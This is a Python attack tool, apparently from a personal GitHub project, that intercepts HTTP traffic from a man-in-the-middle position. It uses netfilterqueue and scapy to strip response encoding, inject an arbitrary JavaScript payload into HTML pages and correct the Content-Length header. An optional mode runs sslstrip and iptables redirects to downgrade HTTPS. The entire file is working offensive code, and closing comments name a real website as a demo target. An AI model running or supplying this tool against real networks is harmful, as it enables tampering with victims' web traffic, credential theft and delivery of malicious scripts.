#!/usr/bin/env python

"""
Author: Matthew Zito (goldmund) 
Contact: https://www.github.com/MatthewZito
Version: 0.1.0

Presumes controller is MITM.
Allocates HTTP Txs into a queue. Isolates HTTP raw load layer,
matches encoding against a regex and supplants with an empty str
to elicit plaintext HTML response, which enables JS injection.
"""
import subprocess
import netfilterqueue
import scapy.all as scapy
import argparse
import re

ENCODING_REGEX = "Accept-Encoding:.*?\\r\\n"
LEN_REGEX = "(?:Content-Length:\s)(\d*)"
INJECTION_REGEX = "</body>"

def elicit_arguments():
    """
    Fetches arguments ...
    """                                                                                                                                                                                                                                                                                                                         
    parser = argparse.ArgumentParser(description="Automates code injection in HTTP responses.")
    parser.add_argument("-p","--payload", dest="payload", help="full Javascript payload")
    parser.add_argument("-d","--downgrade", action="store_true", help="set to downgrade HTTPS")
    args = parser.parse_args() 
    if (not args.payload):
        parser.error("[-] No payload was provided. Use --help for usage instructions." )
    return args

def enable_port_fwd():
    """
    Enables port forwarding through controller machine.
    """
    print("[+] Enabling port forwarding.")
    ip_fwd_cmd = "echo 1 > /proc/sys/net/ipv4/ip_forward"
    # test_cmd = "echo 1 >> hello.txt"
    proc = subprocess.Popen(ip_fwd_cmd, shell=True, stdout=subprocess.PIPE)
    print(proc.communicate()[0]),

def generate_load(packet, load):
    """
    Surrogates target file with controller-provided file.
    Configures necessary fields to generate valid packet response,
    returns said modified response.
    """
    packet[scapy.Raw].load = load
    del packet[scapy.IP].len
    del packet[scapy.IP].chksum
    del packet[scapy.TCP].chksum
    return packet

def process_packet(packet): 
    """
    Determines how to process each packet in queue.
    Modifies HTTP Raw/Load layers req/res objects and injects
    JavaScript payload into HTML content, as matched against
    the injection regex.
    ...
    """
    # wrap payload packet in Scapy IP layer
    global payload, port
    scapy_packet_obj = scapy.IP(packet.get_payload())
    if (scapy_packet_obj.haslayer(scapy.Raw)):
        load = scapy_packet_obj[scapy.Raw].load
        # request obj
        if (scapy_packet_obj[scapy.TCP].dport == port):
            print("[+] Request")
            # remove Encoding header to force resolution of HTML to UTF-8
            load = re.sub(ENCODING_REGEX, "", load)
            # downgrade to 1.0 to avoid chunks proc exception
            load = load.replace("HTTP/1.1" , "HTTP/1.0")
        # response obj
        elif (scapy_packet_obj[scapy.TCP].sport == port): 
            print("[+] Response")
            content_len_grp = re.search(LEN_REGEX, load)
            load = load.replace(INJECTION_REGEX, payload + INJECTION_REGEX)
        
            if (content_len_grp and "text/html" in load):
                content_len = content_len_grp.group(1)
                new_content_len = int(content_len) + len(payload)
                load = load.replace(content_len, str(new_content_len))

        if (load != scapy_packet_obj[scapy.Raw].load):
            generated_packet = generate_load(scapy_packet_obj, load)
            packet.set_payload(str(generated_packet))

    packet.accept()

def bind_queue():
    """
    Initiates a netfilterqueue object and binds to callback method
    so as to access the queue and act upon all packets therein.
    """
    queue = netfilterqueue.NetfilterQueue()
    queue.bind(0, process_packet)
    queue.run()

def instantiate_queue():
    """
    Enables queue by setting IP Tables rules to accomodate forwarding.
    """
    global downgrade
    print("[+] Instantiating queue...")
    fwd_cmd = "iptables -I FORWARD -j NFQUEUE --queue-num 0"
    downgrade_fwd_cmd = "iptables -I OUTPUT -j NFQUEUE --queue-num 0; iptables -I INPUT -j NFQUEUE --queue-num 0"
    downgrade_https = "iptables -t nat -A PREROUTING -p tcp --destination-port 80 -j REDIRECT --to-port 10000"
    enable_port_fwd()
    if (downgrade == True):
        #try:
        proc = subprocess.Popen("sslstrip", shell=True, stdout=subprocess.PIPE)
        print(proc.communicate()[0]),
        proc = subprocess.Popen(downgrade_fwd_cmd, shell=True, stdout=subprocess.PIPE)
        print(proc.communicate()[0]),
        proc = subprocess.Popen(downgrade_https, shell=True, stdout=subprocess.PIPE)
        print(proc.communicate()[0]),
        # except TimeoutExpired:
        #     proc.kill()
    else:
        proc = subprocess.Popen(fwd_cmd, shell=True, stdout=subprocess.PIPE)
        print(proc.communicate()[0]),
    bind_queue()


user_args = elicit_arguments() 
payload = user_args.payload
downgrade = user_args.downgrade
port = 10000 if (downgrade == True) else 80

def main():
    instantiate_queue()

if __name__ == "__main__":
    try:
        main()
    except KeyboardInterrupt:
        print("\n[x] Program terminated by user. Flushing IP Tables...")
        subprocess.call(["iptables --flush"], shell=True)
        
# demo 
# http://iberianodonataucm.myspecies.info/sites/iberianodonataucm.myspecies.info/files/evolucion%20odonatos.PNG
# jpg
# visit: http://iberianodonataucm.myspecies.info/